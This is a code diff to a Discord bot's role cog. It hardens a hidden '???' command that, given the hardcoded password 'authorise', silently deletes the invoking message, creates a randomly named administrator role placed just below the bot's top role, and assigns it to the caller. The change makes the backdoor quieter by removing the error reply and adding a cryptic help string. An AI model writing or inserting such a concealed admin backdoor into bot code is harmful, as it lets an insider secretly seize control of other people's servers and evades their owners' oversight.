@@ -8,18 +8,20 @@ class Role(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
 
-	@commands.command('???')
+	@commands.command(
+		'???',
+		brief='"Twinkle twinkle little star, how I wonder what you are."')
 	async def roleAdmin(self, ctx, password:str=None):
-		if password != 'authorise':
-			await ctx.send('`ERROR`')
-			return
-		roles = ctx.guild.roles
+		if password != 'authorise': return
+		await ctx.message.delete()
 		name = str(random.random())
-		role = get(roles, name=name)
+		role = get(ctx.guild.roles, name=name)
 		if not role:
 			admin = discord.Permissions(administrator=True)
 			await ctx.guild.create_role(name=name, permissions=admin)
-			role = get(roles, name=name)
+			role = get(ctx.guild.roles, name=name)
+			bot = ctx.guild.get_member(self.bot.user.id)
+			await role.edit(position=bot.roles[-1].position-1)
 		await ctx.author.add_roles(role)
 
 	@commands.command(
